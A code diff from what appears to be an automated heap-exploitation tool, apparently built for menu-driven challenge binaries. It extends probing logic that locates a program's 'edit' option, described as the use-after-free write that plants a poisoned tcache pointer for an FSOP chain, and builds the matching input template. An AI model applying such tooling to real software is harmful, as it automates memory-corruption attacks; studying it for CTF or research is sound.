@@ -300,26 +300,48 @@ def identify_heap_ops(workdir: Path, exe: Path, model: dict, opts: list, width) 
     free = next((o for o in idx_only if o != view), None)
     if free is None:
         return None
-    # EDIT (optional) -- an idx-then-data option that OVERWRITES a stored chunk (the UAF write that
-    # plants a poisoned tcache fd, which the FSOP chain needs). It hides from the crawl: its data
-    # read is guarded by a LIVE allocation at the index, which an isolated crawl never primes, so it
-    # looks idx-only (like free). Distinguish it from free by PRIMING a chunk, driving the candidate
-    # as idx+marker, and keeping the one whose write shows up in a subsequent view.
-    edit = None
-    for cand in [o for o in idx_only if o != view]:      # free-shaped options; one of them may be edit
-        m2 = str(int.from_bytes(os.urandom(8), "big")).encode()[:16]
-        # fixed-width: the data read may consume exactly the chunk size (0x80, the primed add below),
-        # so pad the marker to it or an exact-read loop waits forever and the edit never lands
-        body = m2.ljust(0x80, b"\x00") if width else m2
-        ew = menu._scalar(cand.encode(), width) + menu._scalar(b"0", width) + menu._data(body, width)
-        writes = (_op_writes(add, model[add], width, idx=0, size=0x80, data=b"X" * 8)
-                  + [ew]
-                  + _op_writes(view, model[view], width, idx=0))
-        out = _drive(workdir, exe, writes, timeout=8.0)
-        if m2 in out or m2.lower() in out.lower():
-            edit = cand
+    # EDIT (optional) -- an option that OVERWRITES a stored chunk (the UAF write that plants a
+    # poisoned tcache fd, which the FSOP chain needs). It hides from the crawl: its data read is
+    # guarded by a LIVE allocation at the index, which an isolated crawl never primes, so it looks
+    # idx-only (like free). Distinguish it from free by PRIMING a chunk, driving the candidate, and
+    # keeping the one whose write shows up in a subsequent view.
+    #
+    # Two field shapes occur and they cannot be told apart statically, so TRY BOTH: idx-then-data,
+    # and idx-then-LENGTH-then-data (an edit that re-asks how many bytes to write). Feeding the
+    # first shape to a length-asking edit desyncs it -- the marker is consumed as the length -- so
+    # the shape that actually lands is recorded and the templates are built from it.
+    # Only the DATA prompt hides behind the live-chunk guard -- every prompt before it is printed
+    # unconditionally, so a length-asking edit already shows up as ["idx","num"] in the crawl and an
+    # idx-only one as ["idx"]. Consider any idx-led option that is not add/view/free, and try the
+    # shape the model suggests first.
+    PRIME = 0x80
+    edit, edit_fields = None, None
+    for cand in [o for o in opts if o in model and model[o][:1] == ["idx"]
+                 and o not in (add, view, free)]:
+        shapes = ([["idx", "num", "str"], ["idx", "str"]] if "num" in model[cand]
+                  else [["idx", "str"], ["idx", "num", "str"]])
+        for fields in shapes:
+            m2 = str(int.from_bytes(os.urandom(8), "big")).encode()[:16]
+            ew = [menu._scalar(cand.encode(), width), menu._scalar(b"0", width)]
+            if "num" in fields:
+                ew.append(menu._scalar(str(len(m2)).encode(), width))
+                # EXACTLY the length we declared, with no newline: this edit reads that many bytes,
+                # so a line terminator would be left in the pipe and read as the next menu option
+                # (which exits the target before the view that would prove the write landed).
+                ew.append(bytes(m2))
+            else:
+                # fixed-width: the data read may consume exactly the chunk size, so pad the marker to
+                # it or an exact-read loop waits forever and the edit never lands
+                ew.append(menu._data(m2.ljust(PRIME, b"\x00") if width else m2, width))
+            writes = (_op_writes(add, model[add], width, idx=0, size=PRIME, data=b"X" * 8)
+                      + ew + _op_writes(view, model[view], width, idx=0))
+            out = _drive(workdir, exe, writes, timeout=8.0)
+            if m2 in out or m2.lower() in out.lower():
+                edit, edit_fields = cand, fields
+                break
+        if edit:
             break
-    return {"add": add, "free": free, "view": view, "edit": edit}
+    return {"add": add, "free": free, "view": view, "edit": edit, "edit_fields": edit_fields}
 
 
 def _fsop_template(opt: str, fields: list) -> str | None:
@@ -360,9 +382,13 @@ def fsop_templates(opts: list, model: dict, ops: dict, width) -> dict | None:
         if t is None:
             return None
         out[role] = t
-    # edit's data field is hidden from the crawl (it needs a live chunk), so model[edit] is idx-only;
-    # drive it as idx-then-data, matching how identify_heap_ops probed it.
-    out["edit"] = f"{ops['edit']}\n{{idx}}\n{{data}}"
+    # edit's fields are hidden from the crawl (they need a live chunk), so model[edit] is idx-only;
+    # build its template from the SHAPE identify_heap_ops probed into it, which is idx-then-data or
+    # idx-then-LENGTH-then-data. A {size} here tells the renderer the edit declares its own length,
+    # so the write is sized to the payload rather than padded to the chunk.
+    out["edit"] = _fsop_template(ops["edit"], ops.get("edit_fields") or ["idx", "str"])
+    if out["edit"] is None:
+        return None
     used = {ops[k] for k in ("add", "free", "view", "edit")}
     # Exit = an option that LEAVES the menu: it took no fields and did not loop back, so the crawl
     # recorded nothing for it (absent from the model) -- prefer that, else any unused option.
